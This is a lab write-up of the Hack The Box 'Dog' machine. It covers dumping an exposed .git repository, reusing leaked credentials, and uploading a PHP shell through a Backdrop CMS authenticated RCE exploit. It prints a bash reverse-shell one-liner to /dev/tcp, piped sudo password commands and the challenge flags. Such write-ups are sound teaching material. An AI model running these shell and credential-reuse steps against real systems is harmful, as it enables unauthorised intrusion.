[Dog](https://app.hackthebox.com/machines/Dog) is an Easy machine released on 8th March 2025 on Hack The Box.

## Write-up

User Flag: `9d58930906b982c8a95dda64277b8af0`

Root Flag: `d2691f18771e7b054cf1857d3f468dc9`

`sudo nmap -A -T4 10.10.11.58`

There is a site running on port 80.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593308/image_piwnmu.png)

Always good practice to have a look around and click all the links. See what you can find.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593311/image_viejjy.png)

You can find the link to Backdrop CMS at the bottom of the dog page.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593313/image_vbkbwx.png)

After viewing the page source, I saw that there was a`/files` directory being referenced.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593315/image_qtypfe.png)

I completely forgot that the Nmap output shows there are some hidden directories. So, you don't even need to inspect the source code as the initial Nmap output quite literally tells you that `/.git`exists.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593314/image_yikf0w.png)

I then went back to further digging in the `./git`directory.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593316/image_hltj9z.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593318/image_gsxjdl.png)

Ok so this looks like a hint that `dog@dog.htb` is a root user.

This seemed like a pretty big hint that`dog@dog.htb` is a root user. I then went to have a nosey through `robots.txt`for good measure.

`http://10.10.11.58/robots.txt`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593320/image_tnuicd.png)

It seemed as though there was an administrator page, but I was unable to access it.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593322/image_pnpoar.png)

`/core/` and `/profiles/` then took my interest and I spent some time digging around

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593324/image_tlfj2h.png)

I could not get into `/profiles` for whatever reason. Within `/core` I wasn't seeing much. Although it is nice to see the structure of the directories, find where PHP scripts are kept and such.

Further exploration of the site tipped off that the version of CMS was version 1. That suck out to me as really odd. I thought that maybe there was an obvious exploit there.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593332/image_yq59w5.png)

`searchsploit Backdrop`

I then downloaded the`/.git` directory so that I can explore the commits for useful information.

`sudo pip install git-dumper`

`git-dumper http://10.10.11.58/.git/`

`./dog_git_repository`

`settings.php` contained a username and password.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593335/image_wiamvl.png)

`root:BackDropJ2024DS2024`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593336/image_vua0bd.png)

No port open so I expected this but it was worth trying.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593339/image_u4wfzz.png)

Having a little look in to the commit history. Something to do with URL aliases and customization.

[URL Aliases | Documentation](https://docs.backdropcms.org/documentation/url-aliases)

`git show 8204779c764abd4c9d8d95038b6d22b6a7515afa`

`git show 8204779c764abd4c9d8d95038b6d22b6a7515afa > commit-details.txt`

`cat commit-details.txt`

I hit a little stumbling block here as `comit-details.txt` was giving out a massive output which seemed like a rabbit hole. I then tried the *root* user and the password I found on the website, but it did not work. The password seems like a pretty big hint, maybe it works for another user. But I didn't see one. The website wants a username or email.

`grep -r -i -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" .`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593341/image_p5bkjw.png)

Right at the bottom of the output. What a dumb challenge.

`tiffany@dog.htb:BackDropJ2024DS2024`

And we're in.... `tiffany`was reusing her password for the database and her website login.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593343/image_zrfuim.png)

So now the next task is to get into the backend system. Finding an exploit for the CMS version 1 looked like an obvious attack vector. I went back through the searchsploit results from earlier and just picked an exploit at random - because why not. This one mentioned that it was authenticated, and I had credentials at this point so it's worth an attempt.

`Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) | php/webapps/52021.py`

Going back to the searchsploit outputs we looked at earlier let's just fire one at the system because why not.

`searchsploit -p 52021`

`cat /usr/share/exploitdb/exploits/php/webapps/52021.py`

[Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/52021)

The exploit takes advantage of a flaw in Backdrop CMS that allows authenticated users to execute arbitrary commands on the server. This typically happens due to improper input validation or insufficient sanitization of user inputs.

I set up the file and fired away. I then logged in to the site with the administrator credentials and saved the exploit to `/admin/modules/install`. Note: I had a lot of issues trying to get this exploit to run but I left in the errors that I made along the way for educational purposes.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593346/image_aemwxo.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593348/image_u9ynwe.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593349/image_e2cerg.png)

The site expects a ZIP file.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593351/image_oqqslc.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593354/image_lsbllq.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593355/image_lyupkx.png)

It wanted a `.info`file? I then created a fake one, not knowing what the purpose was.

OK. I actually needed to run the exploit **FIRST** because it will create all the files I need for me. Had I of read the exploit properly I would have known this.

`python3 exploit.py http://dog.htb`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593357/image_yjwu6i.png)

Make sure to extract it because the site wants a `.tar.gz`file not a `.zip`. I then deleted all the archives and then made a new one with the command below. Then uploaded the archive it creates. One glaring issue that I had at this point was that the `shell.php`file it creates won't have the correct information inside to actually get back to my machine. At this point this was fine because I just wanted to see if I could successfully upload a file before getting too invested.

`tar -cvzf shell.tar.gz shell/`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593360/image_cylcjl.png)

http://10.10.11.58/?q=admin/installer/manual

`nc -lvnp 4444`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593363/image_vlxxrc.png)

I needed to do these steps again but with my own custom PHP shell in `shell.php`.

```

I then archived it again and uploaded it with the listener open and go to the shell address.

`nc -lvnp 4444`

Make sure `dog.htb`is in `/etc/hosts`.

http://dog.htb/modules/shell/shell.php

`bash -c 'bash -i >& /dev/tcp/10.10.14.65/4444 0>&1'`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593372/image_b4gmjj.png)

And I got a shell. As always, the first step is to snoop around and enumerate whatever you can to see what you have access to.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593375/image_bnxeyu.png)

I tried to login as `tiffany`but she didn't exist as a user.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593377/image_wa3xk1.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593379/image_m9zrqg.png)

There were really only two users that stuck out. `johncusack`and `jobert`.

`su johncusack`

I then remember that I have the database credentials from earlier, they may be re-useable **AGAIN** if we are lucky - `root:BackDropJ2024DS2024`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593381/image_yybfdk.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593383/image_zpd72i.png)

At this point I am no longer on a service account, but a regular user account so in theory I should have more permissions, and it should be easier to escalate to root.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593385/image_youkww.png)

We had initially transitioned from a service account with an ID of `33` to a regular user with an ID of `1001`. The next step was to locate the user flag before attempting to escalate to root. However, the shell was quite limited, and it was hard to see much. At the start, there was an error: `shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory`. This happened because I was in a directory that `johncusack` didn’t have access to. To resolve this, I simply navigated to `/tmp` to get to a valid directory, after which commands started working properly. From there, I was able to explore the file system.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593388/image_zslciq.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593390/image_byyyhh.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593392/image_tjf9cl.png)

Next, I wanted to escalate to root, but I ran into trouble enumerating this account's permissions with `sudo -l`. I suspected this was a limitation of the poor shell I had. Unfortunately, Python didn’t seem to be installed on the system, so upgrading the shell wasn't an option.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593394/image_omxa19.png)

The `sudo -l` command is used to list the commands that the current user is allowed to execute with `sudo` privileges, as well as any restrictions defined in the `sudoers` configuration. Essentially, it shows what commands the user can run as another user (often root) using `sudo`.

In this specific case, I needed to alter the command to pipe the password into `sudo` via standard input, bypassing the need for an interactive TTY prompt. Normally, when executing a `sudo` command, the shell prompts for a password interactively, but because of the poor shell environment, this prompt never appeared. To work around this, I had to supply the password directly within the command.

`echo "your_password" | sudo -S -l`

`echo "BackDropJ2024DS2024" | sudo -S -l`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1752593396/image_j1m5bs.png)

Supposedly, this piping strategy would cache the authentication for 5 minutes, after which it would stop working and require the password to be piped again. The result was that I was now able to run `bee`commands. So, I started exploring.

`sudo /usr/local/bin/bee --help`

## Thoughts

A great box that I enjoyed. I liked that the discovered credentials could be re-used because it mirrors the real-world in that people **ALWAYS** use the same password for multiple accounts and services. It's nice to see a more realistic attack vector for once. Additionally, I had a lot of issues with the reverse shell because the exploit setup was a bit awkward. And then on top the CMS site was unstable (at least when I attempted it) so the shell would break quite easily. But with some perseverance we got there in the end.
